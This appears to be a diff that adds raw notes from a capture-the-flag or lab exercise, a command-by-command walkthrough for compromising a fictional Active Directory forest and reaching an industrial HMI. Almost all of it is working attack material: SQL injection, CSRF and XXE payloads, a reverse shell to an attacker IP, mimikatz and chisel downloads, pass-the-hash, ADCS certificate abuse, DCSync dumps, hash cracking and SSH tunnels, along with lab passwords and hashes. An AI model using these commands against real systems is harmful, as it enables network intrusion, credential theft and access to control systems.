@@ -1,0 +1,384 @@
+HOST DISCOVERY::::
+
+nmap -sn 10.8.8.0/24
+----------------------------------
+WEB/SQL/CSRF/XXE::::
+
+admin' OR ‘1’=’1’ #
+
+<form
+method="POST"action="https://10.8.8.5/challenge/profile.php">
+<input type="hidden" name="email" value="attacker@example.com">
+<input type="submit" value="Change Email">
+</form>
+
+
+<!DOCTYPE root [<!ENTITY % remote SYSTEM
+"file:///etc/passwd">%remote;]>
+
+<!DOCTYPE root [<!ENTITY % remote SYSTEM
+"file:///home/srvadmin/.bash_history">%remote;]>
+------------------------------------------------
+
+ssh srvadmin@10.8.8.5
+SrvAdmin!@#$%
+
+sudo -l
+
+sudo su -
+ls
+cat
+md5sum ssh-conn.py
+
+DBService@123
+
+-------------------------
+nmap -sT -Pn 10.8.8.7
+------------------------
+db_svc
+DBService@123
+
+ls /mnt/c
+
+sh -i >& /dev/tcp/192.168.100.150/4443 0>&1
+
+rlwrap nc -lnvp 4443
+----------------------------
+/mnt/c/Windows/System32/WindowsPowerShell/v1.0/powershell.exe
+
+net user /dom
+
+Import-Module ActiveDirectory
+
+Get-ADServiceAccount -Filter *
+
+Get-ADServiceAccount -Filter * -Properties PrincipalsAllowedToRetrieveManagedPassword
+
+------------
+GMSA PASSWORD::::
+
+unzip -l GMSA_Pass_Rader.unzip
+
+mkdir -p /tmp/gmsa-raeder
+unzip GMSA_Pass_Rade.zip -d /tmp/gmsa-raeder
+find /tmp/gmsa-raeder -type f
+----------------------------------
+
+python3 -m http.server
+
+Invoke-WebRequest -Uri "http://192.168.100.150:8000/GMSAPasswordReader.exe" -OutFile "$HOME\Downloads\GMSAPasswordReader.exe"
+
+Test-Path "$HOME\Downloads\GMSAPasswordReader.exe"
+
+.\GMSAPasswordReader.exe --AccountName gmsa_srv
+------------------------------------------------
+HOST SETUP:::::
+
+sudo nano /etc/hosts
+
+ADD::
+10.8.8.2 pwrgrid.mgmt          pwrgrid DC01.pwrgrid.mgmt
+10.8.8.10 office-mac.pwrgrid.mgmt           office-mac
+
+VERIFY:::
+getent hosts pwrgrid.mgmt
+getent hosts office-mac.pwrgrid.mgmt
+
+---------------------------------------------------------------- 
+PSEXEC::::
+
+psexec.py 'pwrgrid/gmsa_srv$@office-mac' -hashes :7A0857D1A6E67FD95DFF403AC53395E4 -debug
+
+--------
+powershell
+
+Import-Module ActiveDirectory
+
+Get-ADComputer -Filter * -Properties ipv4Address | Format-List Name, DNSHostName, ipv4*
+-----------------------------------------------------
+DUMP HASH::::
+
+secretsdump.py 'pwrgrid.mgmt/gmsa_srv$@office-mac' -hashes :7A0857D1A6E67FD95DFF403AC53395E4 -debug
+
+secretsdump.py 'pwrgrid.mgmt/gmsa_srv$@office-mac' -hashes :CB79AC65D34D10AE3F637B982401F3E5 -debug
+------------------------------------------------------------
+psexec.py 'PWRGRID.MGMT/gmsa_srv$@10.8.8.10' -hashes :7A0857D1A6E67FD95DFF403AC53395E4
+
+psexec.py 'PWRGRID.MGMT/gmsa_srv$@10.8.8.10' -hashes :CB79AC65D34D10AE3F637B982401F3E5
+
+-------------------------------------
+
+cd %temp%
+
+powershell 
+
+Invoke-WebRequest -Uri "http://192.168.100.150:8000/mimikatz.exe" -OutFile "C:\Windows\Temp\mimi.exe" -Force
+
+---------------------
+MIMI::::
+
+.\mimi.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" >> tmp12.log
+
+type tmp12.log
+--------
+
+.\mimi.exe
+privilege::debug
+sekurolsa::logonpasswords
+----------------------------------
+DC:::: certipy:::: emp_user
+
+cat /etc/hosts
+
+certipy find -u emp_user@pwrgrid.mgmt -hashes AA768205A3C4E13F4A9D954ACE716C8D -dc-ip 10.8.8.2 -json -debug
+
+ESC1::::
+certipy template -username emp_user@pwrgrid.mgmt -hashes AA768205A3C4E13F4A9D954ACE716C8D -template User -dc-ip 10.8.8.2 -debug
+
+-----------
+RESUEST CERTIFICATE::::
+
+certipy req -username emp_user@pwrgrid.mgmt -hashes AA768205A3C4E13F4A9D954ACE716C8D -ca ad-cs01 -target ad-cs01.pwrgrid.mgmt -template User -upn administrator@pwrgrid.mgmt -debug
+
+EXTRACT CERTIFICATE & KEY::::
+
+certipy cert -pfx administrator.pfx -nokey -out "user.crt"
+
+certipy cert -pfx administrator.pfx -nocert -out "user.key"
+
+----------------
+ELEVATE USER TO GET DCSYNC::::emp_user
+
+python3 passthecert.py -action modify_user -crt user.crt -key user.key -domain "pwrgrid.mgmt" -dc-ip "10.8.8.2" -target "emp_user" -elevate -debug
+
+
+-----------
+DCSYNC TO DUMP CREDENTIALS::::
+
+secretsdump.py 'pwrgrid.mgmt/emp_user@pwrgrid.mgmt' -hashes :AA768205A3C4E13F4A9D954ACE716C8D -debug
+
+-----------------------------------------------
+MOVE LATERALLY TO DC::::
+PASS THE KEY TECHNIQUE::::
+REQUEST TGT WITH getTGT tool::::
+
+getTGT.py pwrgrid.mgmt/administrator -hashes :b99a21deac72b9eb71885d5730e93e5a -debug
+
+EXPORT IT::::
+
+export KRB5CCNAME=administrator.ccache
+
+LOL::::
+- Sync the NTP server with DC :
+sudo ntpdate pwrgrid.mgmt
+----------------------------------------------
+ACCESS DC)! WITH PSEXEC::::
+
+psexec.py -k -no-pass pwrgrid.mgmt/administrator@DC01.pwrgrid.mgmt -debug
+---------------------------------------
+ENUMURATE DC)! & SEARCH @ND FOREST::::
+
+powershell
+
+Import-Module ActiveDirectory
+
+Get-ADTrust -Filter *
+-------------------------------------
+
+TO GET ANSWER::::
+
+Get-ADObject -SearchBase "CN=ForeignSecurityPrincipals,DC=pwrgrid,DC=mgmt" -Filter * -Properties objectSid | Select-Object Name,ObjectSid
+
+
+--------------------------------------------
+POWERSHELL SCRIPT TO EXTRACT FSPs IN PWRGRID>MGMT::::
+
+$fsp = Get-ADObject -Filter {ObjectClass -eq "foreignSecurityPrincipal"}
+foreach ($f in $fsp)
+    {    foreach ($sid in $f.Name)
+        {
+               $s = New-Object System.Security.Principal.SecurityIdentifier $sid
+               $user = $s.Translate([System.Security.Principal.NTAccount])
+               Write-Host "FSP Users in pwrgrid.mgmt Forest" : $($user.Value)
+        }
+    }  
+
+------------------------------------------------------
+DUMP DIRECTORY THAT HAS USERS SERVICE ACCOUNTS COMPUTER ACCOUNTS CACHED CREDENTIALS::::
+
+export KRB5CCNAME=administrator.ccache (MAKE SURE)
+
+secretsdump.py -k -no-pass pwrgrid.mgmt/administrator@DC01.pwrgrid.mgmt -debug
+---------------------------------
+FSP BREAK::::
+
+echo '$DCC2$10240#fsp_bkp#c05bf437de8b9c25930a1e2ec7818a2f' > huihuihui.txt
+
+hashcat -m 2100 -a 0 huihuihui.txt /usr/share/wordlists/fasttrack.txt --force --potfile-disable
+
+---------------------------------------------------------------------------------------------
+CHISEL::::
+
+PUT CHISSEL IN WINDOWS DC::::
+python3 -m http.server
+
+Invoke-WebRequest -Uri "http://192.168.100.150:8000/chisel.exe" -OutFile "C:\Windows\Temp\chisel.exe"
+
+attacker::
+./chisel server -p 4444 --reverse
+
+WIN::::
+C:\Windows\Temp\chisel.exe client 192.168.100.150:4444 R:socks
+---------------------------------------------------------------
+PROXYCHAINS SETUP::::
+
+sudo nano /etc/proxychains4.conf
+
+socks5 127.0.0.1  1080
+
+-----------------------------------------------------------------
+TEMPLATE USER UPDATE::::
+
+certipy template -username fsp_bkp@pcn.ctrl -password 'P@55w0rd!' -template User -write-default-configuration -dc-ip 10.8.8.2 -debug
+
+Administrator certificate::::
+certipy req -username 'fsp_bkp@pcn.ctrl' -password 'P@55w0rd!' -ca ad-cs01 -target ad-cs01.pwrgrid.mgmt -template User -upn administrator@pcn.ctrl
+
+
+
+EXTRACT CERTIFICATE & KEY::::
+
+certipy cert -pfx administrator.pfx -nokey -out "user.crt"
+
+certipy cert -pfx administrator.pfx -nocert -out "user.key"
+
+--------------------------------------------------------
+PASS THE CERT::::
+
+
+(make sure delete the old or move them or rename tehm)
+proxychains4 python3 passthecert.py -action modify_user -crt 'user.crt' -key 'user.key' -domain "pcn.ctrl" -dc-ip "172.16.62.2" -target "fsp_bkp" -elevate -debug
+
+--------------------------------------
+DCSYNC CREDS DUMP::::
+
+proxychains secretsdump.py 'pcn.ctrl/fsp_bkp:P@55w0rd!@pcn.ctrl' -debug
+
+-----------------------------------------------------------------
+USING PASS THE KEY DUMP KERBEROS CCCASHE::::
+
+proxychains4 getTGT.py pcn.ctrl/administrator -hashes :e65a216b52c3a390fd58c50c0a30a5d7 -debug
+
+export KRB5CCNAME=administrator.ccache
+
+
+sudo ntpdate pcn.ctrl
+--------------------------------------------------
+DC02 CODE EXECUTION using kerberos file cccahse::::
+(same terminal ehere u export)
+
+proxychains4 psexec.py -k -no-pass pcn.ctrl/administrator@DC02.pcn.ctrl -debug
+
+----------------------------------------------------------------------
+DC02::::
+
+
+hostname 
+whoami
+ipconfig
+net user /domain
+
+----------
+powershell
+
+Import-Module ActiveDirectory
+
+Get-ADComputer -Filter * -SearchBase "CN=Computers, DC=PCN, DC=CTRL"
+
+---------------------
+10 ANSWEWR::::
+
+Get-ADComputer -Filter * -Properties DNSHostName | Select-Object Name, DNSHostName
+-----------------------------
+ANSWER !!::::
+
+Get-ChildItem C:\ -File -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.Name -match 'backup|\.bak$|\.zip$|\.7z$' } | Select-Object FullName, Length
+
+Get-FileHash "C:\path\to\backup-file" -Algorithm SHA256
+-------------------------------------------------------------------------
+SEARCH::::
+
+dir "C:\Users\Administrator\AppData\Roaming\Notepad++\"
+
+dir "C:\Users\Administrator\AppData\Roaming\Notepad++\backup"
+
+type "C:\Users\Administrator\AppData\Roaming\Notepad++\backup\new 1@2023-10-13_081939"
+
+------
+Get-FileHash -LiteralPath "C:\Users\Administrator\AppData\Roaming\Notepad++\backup\new 1@2023-10-13_081939" -Algorithm SHA256 | Select-Object -ExpandProperty Hash
+
+
+-----------------------------------
+JUMP::::
+
+proxychains4 nmap -sT -Pn 172.16.62.10
+
+proxychains ssh jadmin@172.16.62.10
+NOTE : Password: Jump@123 
+
+---
+
+ls /etc/krb5.conf
+
+cat /etc/krb5.conf
+--------
+Request "jadmin" TGT:
+kinit jadmin
+NOTE : Enter password "Jump@123"
+
+Verify the tickets in memory :
+klist
+
+Request HOST Service Ticket from jadmin TGT:
+kvno host/hmi.pcn.ctrl
+
+Verify the tickets in memory :
+klist
+
+List keys stored in the keytab file:
+sudo klist -k -t /etc/krb5.keytab
+-----------------------------------
+Answer11:::
+
+Get-FileHash -LiteralPath "C:\Users\Administrator\AppData\Roaming\Notepad++\backup\new 1@2023-10-13_081939" -Algorithm SHA256
+
+------------------------------------------
+HMI::::
+
+
+ssh root@hmi.pcn.ctrl -v
+
+-----
+[CHECK PORT]
+netstat -ant
+
+-------------------------
+
+1. Attacker Box to Jumpsrv :
+proxychains4 ssh -L 53533:127.0.0.1:8888 jadmin@172.16.62.10
+
+pass:: Jump@123
+
+NOTE : Creating a tunnel from attacker to Jumpsrv
+
+
+2. Jumpsrv to HMI :
+ssh -L 8888:127.0.0.1:80 root@hmi.pcn.ctrl
+
+NOTE : Creating a tunnel from Jumpsrv to HMI
+
+
+
+
+
+
